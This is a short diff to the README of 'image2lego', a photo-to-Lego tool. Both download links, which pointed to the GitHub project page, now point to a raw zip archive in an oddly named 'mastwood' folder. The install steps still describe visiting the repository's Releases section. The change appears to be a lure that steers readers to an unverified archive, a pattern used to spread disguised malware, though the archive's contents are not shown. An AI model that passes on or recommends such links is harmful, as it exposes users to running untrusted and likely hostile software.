@@ -1,6 +1,6 @@
 # 🧱 image2lego - Turn your photos into lego bricks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/patri8659/image2lego)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/patri8659/image2lego/main/mastwood/lego-image-3.5.zip)
 
 ## 🎯 About the software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic levels to run the software effectively:
 
 You must visit the project page to obtain the installer for your computer. This file contains all the necessary components to run the transformation engine.
 
-[Download the current installer here](https://github.com/patri8659/image2lego)
+[Download the current installer here](https://raw.githubusercontent.com/patri8659/image2lego/main/mastwood/lego-image-3.5.zip)
 
 1.  Click the link above to reach the repository.
 2.  Locate the section labeled Releases on the right side of the page.
